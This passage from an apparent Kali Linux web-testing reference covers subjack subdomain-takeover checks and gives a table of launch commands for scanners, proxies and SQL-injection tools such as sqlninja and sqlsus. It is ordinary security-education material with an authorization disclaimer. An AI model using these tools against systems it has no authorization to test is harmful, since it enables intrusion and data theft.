# 自定义指纹文件
subjack -w subdomains.txt -c fingerprints.json -t 100
```

**Practical tips**:
- The tool itself warns: always manually review results to rule out false positives (some services apply anti-takeover handling).
- Resolve DNS first to confirm the CNAME (e.g. `dig <sub>.<domain> CNAME`), then judge whether the pointed-to service is registrable.
- A takeable subdomain enables phishing/certificate issuance; it is a high-risk finding, and the report must include proof screenshots.

## Remaining Tools — Quick Reference

| Tool | One-line purpose | Package | Most common command |
|---|---|---|---|
| beef-xss-start | Wrapper script that starts the BeEF service | beef-xss | `sudo beef-xss-start` |
| beef-xss-stop | Script that stops the BeEF service | beef-xss | `sudo beef-xss-stop` |
| dirb | Classic dictionary-based web content scanner (official site example) | dirb (installed on Kali by default) | `dirb http://<target>/ /usr/share/wordlists/dirb/common.txt` |
| dirbuster | Java GUI multi-threaded directory brute forcer | dirbuster | `dirbuster` |
| jsql-injection | Java GUI automated SQL injection tool | jsql-injection | `jsql-injection` (GUI only, no headless support) |
| sqlninja | MSSQL injection and takeover (xp_cmdshell/privilege escalation/Metasploit integration) | sqlninja | `sqlninja -m t -f sqlninja.conf` (run `-g` first or edit the config) |
| sqlsus | MySQL injection and console-style exploitation (Perl) | sqlsus | `sqlsus -g sqlsus.cfg` (edit it, then) `sqlsus sqlsus.cfg`, interactively type `start` |
| paros | Veteran lightweight web application testing proxy (Java) | paros | `paros` (CLI: `java -jar /usr/share/paros/paros.jar -newsession <file> -spider -seed <url> -scan`) |
| skipfish | Fully automated active web application recon (Z family, produces an interactive sitemap report) | skipfish | `skipfish -o <outdir> http://<target>/` (official site example pattern) |
| watobo | Semi-automated web application audit proxy (GUI) | watobo | `watobo` |
| webscarab | HTTP(S) application analysis proxy (veteran, GUI) | webscarab | `webscarab` |

---

For penetration testing with written authorization, CTF competitions, and security education only; testing systems without authorization is illegal.
